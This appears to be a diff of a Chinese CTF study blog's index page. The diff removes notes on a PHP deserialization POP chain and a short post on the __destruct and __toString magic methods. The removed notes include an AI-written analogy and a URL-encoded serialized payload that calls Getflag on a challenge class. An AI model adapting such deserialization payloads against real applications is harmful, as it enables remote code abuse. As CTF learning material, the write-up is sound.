-<li>因为 <code>$a</code> 是对象链的入口点。序列化 <code>$a</code> 会自动包含其属性指向的所有对象（<code>$b</code> 和 <code>$c</code>）。</li>
-<li>攻击者只需传递序列化后的 <code>$a</code>，即可在反序列化时还原整个对象链，触发漏洞。</li>
-</ul>
-<hr>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
-<li><strong>序列化是递归的</strong>：对象属性中的其他对象会被自动包含。</li>
-<li><strong>反序列化还原完整对象链</strong>：攻击者只需控制入口对象（<code>$a</code>），即可通过反序列化重建整个攻击链。</li>
-<li><strong>你的代码逻辑正确</strong>：通过 <code>$a → $b → $c</code> 的嵌套关系，成功构造了反序列化漏洞利用链。</li>
-</ul>
-<p>还问了一些蠢问题就不写了。</p>
-<p>不过，人之常情，ds写的这个比喻真好：</p>
-<h3 id="完美类比：密码锁与齿轮机关"><a href="#完美类比：密码锁与齿轮机关" class="headerlink" title="完美类比：密码锁与齿轮机关"></a>完美类比：<strong>密码锁与齿轮机关</strong></h3><hr>
-<p>想象题目中的 <strong>类（Class）</strong> 是一个设计好的 <strong>密码锁</strong>，而 <strong>Payload</strong> 就是你根据锁的机械结构，精心制作的 <strong>密码组合</strong>。你需要通过分析锁的齿轮、弹簧、卡扣（即类的属性和魔术方法），找到正确的密码（Payload），才能触发机关，打开锁（获取 flag）。</p>
-<hr>
-<h3 id="分步类比："><a href="#分步类比：" class="headerlink" title="分步类比："></a><strong>分步类比：</strong></h3><h4 id="1-密码锁的结构（类的设计）"><a href="#1-密码锁的结构（类的设计）" class="headerlink" title="1. 密码锁的结构（类的设计）"></a>1. <strong>密码锁的结构（类的设计）</strong></h4><ul>
-<li><strong>齿轮组</strong>（类的属性）：<br>锁内部有多个齿轮（如 <code>w22m::$w00m</code>、<code>w33m::$w00m</code>），它们的齿形（属性值）需要精确对齐才能转动。</li>
-<li><strong>弹簧机关</strong>（魔术方法）：<br>锁的某些位置隐藏了弹簧（如 <code>__destruct()</code>、<code>__toString()</code>），当齿轮转到特定位置时，弹簧会被触发。</li>
-<li><strong>最终机关</strong>（目标方法）：<br>锁的核心是一个隐藏的开关（<code>w44m::Getflag()</code>），只有所有齿轮和弹簧正确联动，才能触发它。</li>
-</ul>
-<hr>
-<h4 id="2-破解密码的过程（构造-Payload）"><a href="#2-破解密码的过程（构造-Payload）" class="headerlink" title="2. 破解密码的过程（构造 Payload）"></a>2. <strong>破解密码的过程（构造 Payload）</strong></h4><ul>
-<li><strong>观察锁的结构（分析代码）</strong>：<br>你发现锁的齿轮必须按以下顺序联动：<br><strong>齿轮A（w22m）→ 齿轮B（w33m）→ 齿轮C（w44m）</strong>。<br>且齿轮B上有一个标记（<code>w33m::$w22m</code>），必须指向特定位置（<code>&quot;Getflag&quot;</code>）。</li>
-<li><strong>制作密码（Payload）</strong>：<br>你调整齿轮的齿形（设置属性值），使得：<ul>
-<li>齿轮A的齿形卡住齿轮B（<code>w22m::$w00m = w33m 对象</code>）。</li>
-<li>齿轮B的齿形卡住齿轮C（<code>w33m::$w00m = w44m 对象</code>）。</li>
-<li>齿轮B的标记指向 <code>&quot;Getflag&quot;</code>（<code>w33m::$w22m = &#39;Getflag&#39;</code>）。</li>
-</ul>
-</li>
-<li><strong>输入密码（发送 Payload）</strong>：<br>将调整好的齿轮组合（序列化字符串）输入锁中（通过 HTTP 请求）。</li>
-</ul>
-<hr>
-<h4 id="3-触发机关（反序列化执行）"><a href="#3-触发机关（反序列化执行）" class="headerlink" title="3. 触发机关（反序列化执行）"></a>3. <strong>触发机关（反序列化执行）</strong></h4><ul>
-<li><strong>齿轮开始转动（反序列化）</strong>：<br>锁的机械结构（PHP 引擎）按照你设计的齿轮组合开始运转。<ul>
-<li>齿轮A（<code>w22m</code>）触发弹簧1（<code>__destruct()</code>）。</li>
-<li>弹簧1推动齿轮B（<code>w33m</code>）转动，触发弹簧2（<code>__toString()</code>）。</li>
-<li>弹簧2推动齿轮C（<code>w44m</code>），最终触发隐藏开关（<code>Getflag()</code>）。</li>
-</ul>
-</li>
-<li><strong>锁被打开（获取 flag）</strong>：<br>如果所有齿轮的齿形（属性值）正确（<code>admin=&#39;w44m&#39;</code>、<code>passwd=&#39;08067&#39;</code>），开关会释放 flag。</li>
-</ul>
-<hr>
-<h3 id="为什么这个类比贴切？"><a href="#为什么这个类比贴切？" class="headerlink" title="为什么这个类比贴切？"></a><strong>为什么这个类比贴切？</strong></h3><ol>
-<li><strong>类的设计是预设的机关</strong>：<br>锁的齿轮和弹簧是锁匠（出题人）预先设计好的，你必须按它的规则来破解。<br>→ 类的魔术方法和属性是出题人写好的逻辑，你必须按它的结构构造 Payload。</li>
-<li><strong>Payload 是精确的密码组合</strong>：<br>密码必须严格匹配齿轮的齿形和弹簧的位置。<br>→ Payload 必须精确设置对象的属性和方法调用链。</li>
-<li><strong>动态调用是隐藏的机关</strong>：<br>齿轮B的标记（<code>w33m::$w22m</code>）决定了最终触发的机关。<br>→ 动态方法调用（<code>$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;()</code>）是触发 <code>Getflag()</code> 的关键。</li>
-</ol>
-<hr>
-<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
-<li><strong>题目中的类</strong> &#x3D; 密码锁的机械结构（预设的齿轮和弹簧）。</li>
-<li><strong>Payload</strong> &#x3D; 你制作的密码组合（精确的齿轮齿形和标记位置）。</li>
-<li><strong>反序列化</strong> &#x3D; 将密码输入锁中，触发齿轮转动和弹簧释放。</li>
-<li><strong>Flag</strong> &#x3D; 锁被打开后的战利品。</li>
-</ul>
-<p>就像开锁需要理解锁的机械原理一样，构造 Payload 需要深入分析类的结构和魔术方法的触发逻辑。</p>
-<h1 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h1><p>O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar_2.gif">
-      <meta itemprop="name" content="温柔刀">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CTF学习笔记">
-      <meta itemprop="description" content="JNU_WEB">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | CTF学习笔记">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/02/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/" class="post-title-link" itemprop="url">PHP反序列化学习笔记汇总</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2025-02-22 15:23:03 / 修改时间：21:01:10" itemprop="dateCreated datePublished" datetime="2025-02-22T15:23:03+08:00">2025-02-22</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-    <span class="post-meta-item-icon">
-      <i class="far fa-comment"></i>
-    </span>
-    <span class="post-meta-item-text">Waline：</span>
-  
-    <a title="waline" href="/2025/02/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/#waline" itemprop="discussionUrl">
-      <span class="post-comments-count waline-comment-count" data-path="/2025/02/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%B1%87%E6%80%BB/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>64</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct()</span><br></pre></td></tr></table></figure>
-
-<p>触发时机：</p>
-<p>1、实例化对象结束后触发  如$test&#x3D;new User();</p>
-<p>2、在反序列化之后立马会触发（序列化不会触发）</p>
-<p>就是</p>
-<p>$a &#x3D;<strong>new</strong> b</p>
-<p><strong>unserialize()</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__toString()</span><br></pre></td></tr></table></figure>
-
-<p>把对象当成字符串使用</p>
-<p>就是</p>
-<p><strong>echo</strong></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
@@ -1511,7 +1282,7 @@
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">57 分钟</span>
+    <span title="站点阅读时长">58 分钟</span>
   </span>
 </div>
 
